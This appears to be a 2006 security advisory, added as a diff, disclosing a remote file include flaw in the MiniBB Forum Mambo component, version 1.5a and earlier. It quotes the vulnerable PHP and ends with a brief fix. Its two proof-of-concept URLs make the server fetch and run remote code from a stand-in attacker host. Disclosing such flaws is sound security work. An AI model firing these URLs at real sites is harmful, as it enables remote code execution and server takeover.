@@ -1,0 +1,92 @@
+---------------------------------------------------------------------------------------------
+
+MiniBB Forum Mambo Component <= 1.5a Remote File Include Vulnerabilities
+-----------------------------------------------------------------------------------------------
+
+ 
+Author          : Ahmad Maulana a.k.a Matdhule
+Date            : July 14th 2006
+Location        : Indonesia, Jakarta
+Web             : http://advisories.echo.or.id/adv/adv39-matdhule-2006.txt
+                  http://www.securityfocus.com/bid/18998
+Critical Lvl    : Highly critical
+Impact          : System access
+Where           : From Remote
+------------------------------------------------------------------------
+
+ 
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+# MiniBB Forum
+
+Application     : MiniBB Forum (com_minibb.php & index.php)
+version         : 1.5a
+
+------------------------------------------------------------------------
+
+ 
+Vulnerability:
+~~~~~~~~~~~~~~~
+ 
+# MiniBB Forum
+
+In folder components we found vulnerability script com_minibb.php.
+
+-----------------------com_minibb.php-----------------------------------
+...................
+
+If ($current=="bb_admin"){
+  include("$absolute_path/components/minibb/bb_admin.php");
+} else {
+  include("$absolute_path/components/minibb/index.php");
+...................
+
+------------------------------------------------------------------------
+
+In folder minibb we found vulnerability script index.php.
+
+-----------------------index.php----------------------------------------
+..............................
+
+define ('INCLUDED776',1);
+
+include ($absolute_path.'/components/minibb/setup_options.php');
+if (isset($HTTP_COOKIE_VARS[$cookiename.'Language']) and $langCook=${$cookiename.'Language'}) { if
+(file_exists("$absolute_path/components/minibb/lang/{$langCook}.php")) $lang=$langCook; }
+include ($absolute_path.'/components/minibb/setup_'.$DB.'.php');
+..............................
+
+Variables $absolute_path are not properly sanitized. When register_globals=on
+and allow_fopenurl=on an attacker can exploit this vulnerability with a simple php injection script.
+ 
+Proof Of Concept:
+~~~~~~~~~~~~~~~~
+ 
+http://[target]/[path]/components/com_minibb.php?absolute_path=http://attacker.com/evil.txt?
+http://[target]/[path]/components/minibb/index.php?absolute_path= http://attacker.com/evil.txt?
+
+Solution:
+~~~~~~~~
+ 
+sanitize variabel $absolute_path.
+ 
+ 
+------------------------------------------------------------------------
+---
+Shoutz:
+~~~~~~
+~ solpot a.k.a chris, J4mbi  H4ck3r for the hacking lesson :)
+~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,anonymous
+~ bius, lapets, ghoz, t4mbun_hacker, NpR, h4ntu, thama
+~ newbie_hacker@yahoogroups.com, jasakom_perjuangan@yahoogroups.com
+~ #mardongan #jambihackerlink #e-c-h-o @ irc.dal.net
+------------------------------------------------------------------------
+---
+Contact:
+~~~~~~~
+ 
+     matdhule[at]gmail[dot]com
+     
+-------------------------------- [ EOF ]---------------------------------- 
+
+# milw0rm.com [2006-07-17]
